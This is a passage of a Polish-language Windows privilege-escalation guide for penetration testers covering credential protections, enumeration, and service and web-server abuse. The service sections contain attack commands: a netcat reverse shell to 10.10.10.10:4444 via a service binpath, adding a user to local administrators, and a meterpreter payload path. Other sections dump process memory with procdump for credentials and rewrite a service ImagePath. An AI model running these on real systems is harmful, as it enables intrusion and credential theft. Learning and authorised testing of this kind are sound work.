**LAPS** służy do **zarządzania hasłami lokalnego Administratora** i zapewnia, że każde hasło jest **unikatowe, losowe i regularnie zmieniane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą uzyskać do nich dostęp wyłącznie użytkownicy z odpowiednimi uprawnieniami przyznanymi za pomocą ACL, co pozwala im wyświetlać hasła lokalnego administratora, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywny, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ochrona LSA

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** tego procesu lub wstrzykiwania do niego kodu przez niezaufane procesy, zwiększając tym samym bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona poświadczeń przechowywanych na urządzeniu przed zagrożeniami, takimi jak ataki pass-the-hash. [**Więcej informacji o Credential Guard znajdziesz tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Poświadczenia buforowane

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez składniki systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, zazwyczaj ustanawiane są poświadczenia domenowe tego użytkownika.\
[**Więcej informacji o poświadczeniach buforowanych**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Sprawdź, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz być w stanie eskalować uprawnienia**. Dowiedz się więcej o grupach uprzywilejowanych i o tym, jak je wykorzystać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Na następnej stronie dowiesz się więcej o **interesujących tokenach** i o tym, jak je wykorzystać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje

```bash
qwinsta
klist sessions
```

### Katalogi domowe

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Zasady dotyczące haseł

```bash
net accounts
```

### Pobieranie zawartości schowka

```bash
powershell -command "Get-Clipboard"
```

## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, wyświetlając listę procesów, **sprawdź, czy w wierszu poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** albo czy masz uprawnienia do zapisu w folderze z plikiem binarnym, aby wykorzystać potencjalne ataki [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Zawsze sprawdzaj, czy nie działają [**debuggery electron/cef/chromium** — można je wykorzystać do eskalacji uprawnień](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Listener debuggera może działać krótko, więc jego brak w pojedynczym pasywnym zrzucie portów nie dowodzi, że nigdy nie był dostępny. Powiąż każdy zaobserwowany listener z jego PID-em, właścicielem procesu i możliwością dostępu do niego przez użytkownika o niższych uprawnieniach; sama nazwa aplikacji lub flaga debugowania nie potwierdza możliwości wykonywania kodu z uprawnieniami innego użytkownika. Rutynowe rozpoznanie prowadź pasywnie, nie wysyłając poleceń do debuggera.

**Sprawdzanie uprawnień do plików binarnych procesów**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Katalogi dynamicznych preprocesorów Snort

Snort 2 może ładować biblioteki współdzielone z katalogu `dynamicpreprocessor directory` zadeklarowanego w konfiguracji wybranej za pomocą `snort.exe -c <config>`. W przypadku zaplanowanego zadania lub usługi uruchamiającej Snort na innym koncie sprawdź dokładnie tę konfigurację oraz ACL zadeklarowanego katalogu modułów. Jeśli Twój token umożliwia tworzenie tam plików, ta ścieżka może być warta sprawdzenia pod kątem code execution przy następnym ładowaniu modułów przez zadanie lub usługę. Zweryfikuj efektywne uprawnienia konta uruchamiającego, aktywną konfigurację, zgodność modułów oraz wszelkie ograniczenia odmowy dostępu lub udziału; sam zapis do katalogu nie dowodzi możliwości eskalacji. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje ładowanie modułów w czasie działania.

### Uprzywilejowana usługa internetowa z zapisywalnym katalogiem dokumentów

W przypadku instalacji Apache w systemie Windows porównaj ścieżkę do pliku wykonywalnego usługi i konto, na którym jest uruchamiana, z wartością `DocumentRoot` w aktywnym pliku `httpd.conf`. W typowym układzie XAMPP sprawdź `C:\xampp\apache\conf\httpd.conf` oraz ACL skonfigurowanego katalogu dokumentów, często `C:\xampp\htdocs`. Jeśli użytkownik z niższymi uprawnieniami może tworzyć pliki w tym katalogu, podczas gdy Apache działa jako `LocalSystem`, wykonanie kodu po stronie serwera może przekroczyć granicę uprawnień hosta. Potwierdź, że usługa działa, że udostępniana jest dokładnie ta ścieżka oraz że obsługa po stronie serwera przetwarza dany typ pliku; sam zapisywalny katalog potwierdza jedynie możliwość tworzenia plików. Sprawdź ACL bez zapisywania pliku testowego:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

W typowej instalacji WAMP usługa może wskazywać na wersjonowany plik `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (lub `C:\wamp\...` w układzie 32-bitowym), a konfiguracja znajduje się obok niego, w `conf\httpd.conf`, zaś domyślny katalog główny to `C:\wamp64\www` lub `C:\wamp\www`. Sprawdź łącznie dokładną ścieżkę obrazu usługi, tożsamość, na której działa, efektywną wartość `DocumentRoot` (w tym rozwinięcie `${INSTALL_DIR}` i nadpisania wirtualnych hostów) oraz ACL katalogu głównego. Katalog WAMP z prawami zapisu nie oznacza, że Apache działa jako `SYSTEM` ani że wykona przesłany plik. [Apache opisuje sposób, w jaki usługa Windows wybiera konfigurację](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Zapisywalny katalog główny IIS i tożsamość sieciowa puli aplikacji

W IIS powiąż zapisywalny katalog fizyczny z **aktywną witryną/aplikacją** w `applicationHost.config`, a następnie ustal skonfigurowaną pulę i handler po stronie serwera. Kod umieszczony w katalogu udostępnianym przez serwer działa jako pula tylko wtedy, gdy IIS przetwarza dany typ pliku, a ścieżka jest osiągalna. Zanim uznasz zapisywalny katalog za możliwość wykonania kodu, sprawdź efektywne uprawnienia bieżącego użytkownika do tworzenia plików, stan działania witryny, handler i nadpisania ustawień dla danej ścieżki.

Dynamiczna kompilacja ASP.NET to osobna ścieżka do sprawdzenia: wygenerowane pliki w katalogu kompilacji aplikacji. Domyślnie jest to katalog `Temporary ASP.NET Files` w odpowiedniej instalacji .NET Framework, ale ustawienie aplikacji `<compilation tempDirectory>` może wskazywać inne miejsce. [Microsoft opisuje lokalizację i podkatalogi poszczególnych aplikacji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) oraz [zaleca odizolowanie katalogów kompilacji, gdy pule aplikacji nie ufają sobie nawzajem](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Jeśli token użytkownika o niższych uprawnieniach pozwala zmodyfikować wygenerowany kod źródłowy w pamięci podręcznej **konkretnej** aplikacji, ustal, czy aplikacja ponownie skompiluje go w kontekście bardziej uprzywilejowanej [tożsamości procesu roboczego](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Same ACL pliku lub katalogu nie dowodzą możliwości wykonania kodu: zestaw informacje o pamięci podręcznej z aktywną aplikacją, efektywnym tokenem i ACL, ustawieniami kompilacji, tożsamością procesu oraz czasem ewentualnej ponownej kompilacji. Ogranicz się do przeglądu metadanych tylko do odczytu; podczas enumeracji nie wywołuj kompilacji ani nie modyfikuj plików pamięci podręcznej.

Pula IIS skonfigurowana jako `ApplicationPoolIdentity` lub `NetworkService` zwykle uwierzytelnia się do zasobów domenowych jako **konto komputera hosta**, choć jej lokalny token może mieć niskie uprawnienia. `LocalSystem` ma już wysokie uprawnienia lokalne i również używa konta komputera w sieci; `LocalService` zazwyczaj przedstawia anonimowe poświadczenia sieciowe. Pula `SpecificUser` używa skonfigurowanego dla niej konta. [Microsoft opisuje te typy tożsamości](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) oraz [tożsamość sieciową puli aplikacji](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Pominięte ustawienie tożsamości może dziedziczyć wartości domyślne puli, które różnią się w zależności od wersji IIS, dlatego ustal efektywną konfigurację zamiast zgadywać na podstawie nazwy puli. Jeśli wykonanie kodu odbywa się w puli używającej w sieci tożsamości konta komputera, sprawdź uprawnienia katalogowe **tego konkretnego komputera**. [DCSync](../active-directory-methodology/dcsync.md) wymaga uprawnień replikacji w kontekście nazewniczym domeny; sam bilet konta maszyny lub rola hosta nie dowodzą ich posiadania. Pasywna enumeracja powinna ograniczać się do sprawdzenia konfiguracji i ACL — bez przesyłania pliku, nawiązywania uwierzytelnienia sieciowego ani żądania biletów.

W przypadku czytelnego handlera ASP.NET, który uruchamia proces pomocniczy, prześledź wartości pochodzące z żądania na etapach uwierzytelniania, deszyfrowania, walidacji i budowania polecenia. Handler, który łączy zdekodowany token z `ProcessStartInfo("cmd", "/c ...")`, może pozwolić metaznakom powłoki zmienić polecenie; [Microsoft opisuje znaki specjalne `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Ustal, czy niezaufany klient może faktycznie wpływać na zdekodowaną wartość i dotrzeć do handlera, a następnie określ efektywną tożsamość puli aplikacji lub podszywanego użytkownika oraz tożsamość procesu potomnego. Czytelny wiersz kodu źródłowego, nasłuchujący port localhost lub słabość formatu tokenu same w sobie nie dowodzą możliwości wykonania polecenia z podwyższonymi uprawnieniami. Podczas pasywnej enumeracji analizuj kod źródłowy i konfigurację puli bez wysyłania sfałszowanych żądań ani uruchamiania procesu pomocniczego.

W przypadku usługi PHP w Windows ścieżka kontrolowana przez żądanie, przekazana do [`include` lub `require`](https://www.php.net/manual/en/function.include.php), może spowodować wykonanie pliku PHP, który użytkownik o niższych uprawnieniach może modyfikować, w kontekście tożsamości procesu roboczego. Potwierdź, że żądanie może dotrzeć do tej instrukcji, rozstrzygnięta ścieżka wskazuje plik, który użytkownik o niższych uprawnieniach może zmodyfikować, a proces roboczy odczytać, obowiązujące ograniczenia ścieżek PHP zezwalają na dołączenie pliku oraz proces roboczy działa z wyższymi uprawnieniami. Nasłuchujący port loopback ani zapisywalny plik same w sobie nie potwierdzają tego łańcucha; podczas pasywnej enumeracji sprawdź kod źródłowy, tożsamość usługi i ACL plików bez wywoływania endpointu.

### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z pakietu Sysinternals. Usługi takie jak FTP mają **poświadczenia zapisane w pamięci jawnym tekstem**; spróbuj zrzucić pamięć i odczytać poświadczenia.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Niebezpieczne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwiać użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

### Import plików projektów z podwyższonymi uprawnieniami

Aplikacja, która automatycznie otwiera projekty z katalogu, do którego zapis może wykonywać użytkownik o niższych uprawnieniach, przekracza granicę zaufania dla danych wejściowych w kontekście konta importującego. Sprawdź **dokładną ścieżkę z prawem zapisu**, proces lub zadanie, które ją otwiera, jego efektywną tożsamość oraz wersję parsera. [Historyczny problem z otwieraniem/przywracaniem projektu w Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) umożliwiał użycie zewnętrznych encji XML w metadanych projektu; encja sieciowa w systemie Windows mogła spowodować uwierzytelnienie konta importującego, jeśli pozwalały na to [zasady dotyczące wychodzącego SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To potencjalny trop prowadzący do ujawnienia poświadczeń, a nie bezpośredniego dostępu administratora: odpowiedź musi dać się wykorzystać przez odrębną autoryzowaną lub podatną ścieżkę, a aktualne wersje należy ocenić pod kątem faktycznego stanu poprawek. Podczas pasywnej enumeracji nie otwieraj spreparowanego projektu; sprawdź przepływ importu i ACL.

## Usługi

Prawo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) do obiektu Service Control Manager (SCM) jest odrębne od praw do istniejącej usługi. Pomyślne, tylko do odczytu żądanie dostępu [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) dla tego prawa jest wskazówką do dalszej analizy, a nie dowodem, że nowa usługa może zostać uruchomiona. [`CreateService` zwraca uchwyt](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) z prawami dostępu do usługi żądanymi podczas jej tworzenia; późniejsze ponowne otwarcie usługi powoduje osobne sprawdzenie uprawnień i może się nie powieść, nawet jeśli można było użyć pierwotnego uchwytu. Osobno zweryfikuj efektywny token lokalny lub zdalny, przyznane prawa uchwytu, konto usługi, zasady uruchamiania oraz ścieżkę pliku wykonywalnego. Podczas pasywnej enumeracji nie twórz ani nie uruchamiaj usługi.

W przypadku zdalnej ścieżki instalacji usługi skoreluj te prawa SCM z udziałem na celu, do którego **to samo logowanie sieciowe** może zapisywać, jego bazowym ACL NTFS oraz lokalną ścieżką do pliku wykonywalnego, który konto usługi może uruchomić. Konto inne niż administrator może przekroczyć tę granicę, jeśli występują nietypowo szerokie prawa SCM oraz ścieżka umieszczenia pliku; udział administracyjny nie jest konieczny. Sam dostęp do zapisu w udziale albo sama wskazówka dotycząca tworzenia usługi przez SCM nie dowodzą, że nową usługę można uruchomić z wyższą tożsamością.

Istniejąca usługa może wywoływać pomocniczy plik wykonywalny podczas uruchamiania, zamykania lub innego zdarzenia cyklu życia, nawet jeśli nie ma go w `ImagePath`. Jeśli nazwa pliku pomocniczego jest rozwiązywana do katalogu, do którego może zapisywać użytkownik o niższych uprawnieniach, a usługa działa z wyższą tożsamością, brakujący plik pomocniczy może być warunkowym kandydatem do podmiany. Potwierdź **faktyczny kod usługi lub udokumentowane wywołanie pliku pomocniczego**, rozwiązaną ścieżkę pliku wykonywalnego i kolejność wyszukiwania, prawa do tworzenia katalogu, tożsamość usługi oraz dostępny wyzwalacz cyklu życia. Katalog usługi z prawem zapisu lub sam brakujący plik nie dowodzą, że usługa załaduje ten plik; podczas pasywnej analizy nie uruchamiaj ani nie zatrzymuj usługi.

W przypadku istniejącej usługi [`SERVICE_START` pozwala przekazać argumenty do `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); jest to odrębne od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Zanim uznasz prawo do uruchomienia za coś więcej niż prawo do sterowania usługą, sprawdź jej kod lub udokumentowany interfejs. Jeśli usługa używa argumentu wybranego przez wywołującego jako ścieżki pliku dziennika lub eksportu, zweryfikuj tożsamość usługi, dokładny przepływ argumentu do operacji zapisu, ograniczenia dotyczące ścieżki oraz uprawnienia do **utworzonego pliku**. Zapis do chronionego katalogu może prowadzić do eskalacji tylko wtedy, gdy istnieje odrębny uprzywilejowany proces, który używa tego pliku; sam zapisywalny plik dziennika lub prawo do uruchomienia usługi nie wystarczą. Podczas pasywnej inwentaryzacji nie uruchamiaj usługi ani nie twórz pliku testowego.

W przypadku agenta monitorującego NSClient++ plik `nsclient.ini`, jeśli można go odczytać, jest **wskazówką do analizy konfiguracji**: może zawierać poświadczenia sieciowe, a `boot.ini` może przekierowywać konfigurację do innej lokalizacji. Sprawdź faktyczne konto usługi, nasłuchujący interfejs WEB i zasady dostępu oraz to, czy uwierzytelniona rola może zmieniać ustawienia lub skrypty. Uprzywilejowane wykonanie wymaga dodatkowo `CheckExternalScripts` (lub innej włączonej ścieżki wykonania), efektywnego prawa do rejestrowania lub modyfikowania polecenia oraz wyzwalacza uruchamiającego je z tożsamością usługi. Interfejs nasłuchujący wyłącznie na loopback nadal może być dostępny dla lokalnego użytkownika, ale sama ścieżka pliku, hasło lub interfejs nie dowodzą istnienia tych uprawnień. Podczas pasywnej enumeracji sprawdź metadane i uprawnienia, nie wyświetlając sekretów ani nie wywołując web API. Zobacz [układ plików NSClient++](https://nsclient.org/docs/concepts/file-layout/), [wskazówki dotyczące bezpieczeństwa sieci i skryptów](https://nsclient.org/docs/setup/securing/) oraz [konfigurację skryptów zewnętrznych](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

W przypadku usługi, której `ImagePath` wskazuje `nssm.exe`, sprawdź faktyczne konto, z którego działa usługa, oraz wartość `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM przechowuje tam aplikację potomną](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), natomiast `AppDirectory` to skonfigurowany katalog roboczy. Zanim uznasz uprawnienia wrappera za całą granicę bezpieczeństwa usługi, sprawdź plik wykonywalny aplikacji potomnej i ACL jego katalogu nadrzędnego. Lokalny endpoint WCF lub SOAP udostępniony przez tę aplikację to odrębna wskazówka do dalszej analizy: potwierdź, że użytkownik o niższych uprawnieniach może połączyć się z nasłuchującym endpointem, konkretna operacja przyjmuje jego dane wejściowe, a proces potomny usługi wykonuje niebezpieczną operację z wyższą tożsamością. Konto usługi, adres URL endpointu ani zapisywalna ścieżka nie dowodzą same w sobie możliwości eskalacji; podczas pasywnej enumeracji nie wywołuj operacji usługi.

W przypadku niestandardowej operacji WCF prześledź przepływ ciągu znaków kontrolowanego przez wywołującego do dowolnego runspace PowerShell. [`Pipeline.Commands.AddScript` dodaje tekst skryptu](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` uruchamia pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` z poświadczeniami transportowymi Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) uwierzytelnia klienta, ale uprawnienia do wywołania **konkretnej** operacji oraz efektywną tożsamość runspace należy sprawdzić osobno. Ścieżka od danych wejściowych wywołującego o niższych uprawnieniach do `AddScript` działającego z wyższą tożsamością usługi stanowi granicę wykonania kodu; sam nasłuchujący port, uwierzytelniony klient ani niewykorzystywana metoda w niezwiązanym zestawie nie są dowodem. Podczas enumeracji statycznie sprawdź wdrożoną usługę, kontrakt, autoryzację i ustawienia personifikacji; nie wywołuj endpointu.

Wyzwalacze usług pozwalają systemowi Windows uruchamiać usługę po wystąpieniu określonych warunków (aktywność nazwanego potoku/endpointu RPC, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itp.). Nawet bez praw SERVICE_START często można uruchomić uprzywilejowane usługi, wywołując ich wyzwalacze. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usługa zbierająca dane diagnostyczne Visual Studio

Instalacje Visual Studio z narzędziami C/C++ mogą zawierać `VSStandardCollectorService150`, usługę diagnostyczną skonfigurowaną do działania jako `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) wykorzystywało junction i wyścig z użyciem łącza object managera do przekierowania resetowania DACL usługi. Wykazana eskalacja wymagała również dostępnej ścieżki naprawy MSI przez Visual Studio Setup WMI Provider oraz pliku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Ten komponent naprawiono w styczniu 2024 roku.

Podczas pasywnej wstępnej analizy sprawdź konto i ścieżkę pliku binarnego tej konkretnej usługi, sprawdź, czy ścieżka kompilatora Setup WMI istnieje, oraz zweryfikuj stan poprawek zainstalowanego komponentu. Wpis usługi, wersja produktu Visual Studio ani sam plik kompilatora nie dowodzą, że host jest podatny. Do inspekcji nie trzeba uruchamiać usługi ani wykonywać naprawy.

Pobierz listę usług:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze.

```bash
sc qc <service_name>
```

Zaleca się posiadanie pliku binarnego **accesschk** z pakietu _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Zaleca się sprawdzić, czy grupa „Authenticated Users” może modyfikować jakąkolwiek usługę:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włączanie usługi

Jeśli występuje ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058._\
_Nie można uruchomić usługi, ponieważ jest wyłączona lub nie ma włączonych urządzeń z nią powiązanych._

Możesz ją włączyć za pomocą

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Pamiętaj, że usługa upnphost zależy od SSDPSRV, aby działać (w przypadku XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:

```
sc.exe config usosvc start= auto
```

### **Modyfikowanie ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” ma uprawnienie **SERVICE_ALL_ACCESS** do usługi, można zmodyfikować plik wykonywalny usługi. Aby zmodyfikować usługę i ją uruchomić, użyj **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Uruchom ponownie usługę

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Uprawnienia można wykorzystać do eskalacji uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia zmianę uprawnień, co pozwala na zmianę konfiguracji usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i zmianę uprawnień.
- **GENERIC_WRITE**: Zapewnia również możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Zapewnia również możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia do plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz zmodyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze, w którym znajduje się plik binarny** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (nie w system32) możesz wyświetlić wszystkie pliki binarne uruchamiane przez usługi, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz także użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** dla pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny przebieg ataku:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny można zapisywać, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne automatyczne kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję awarii, która ją ponownie uruchamia, lub można ją wywołać pośrednio przez korzystającą z niej aplikację.

### Uprawnienia do modyfikacji rejestru usług

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru danej usługi. Sam wpis ACL nie dowodzi, że dostęp jest skuteczny — znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Eskalacja wymaga również dostępnego do modyfikacji pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację firmy Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do uruchamianego pliku binarnego:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

